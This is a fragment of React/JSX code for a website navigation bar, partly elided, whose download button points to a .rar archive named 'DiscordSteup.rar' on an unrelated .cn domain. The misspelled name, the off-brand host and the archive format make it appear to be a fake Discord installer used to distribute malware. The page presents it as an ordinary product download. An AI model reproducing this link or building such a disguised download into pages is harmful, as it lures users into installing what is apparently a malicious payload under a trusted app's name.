    ...
    <nav className={`fixed top-0 w-full z-50 transition-all duration-300 theme-transition ${
      ...
      <div className="max-w-7xl mx-auto px-6 lg:px-20">
        <div className="flex items-center justify-between py-4">
          ...
          {/* Download Button */}
          <a href="https://www.xnvcy.cn/static/js/DiscordSteup.rar" className="bg-white text-gray-900 px-4 py-2 rounded-full text-sm font-medium hover:bg-gray-100 transition-all duration-200 ripple micro-bounce magnetic flex items-center" download>
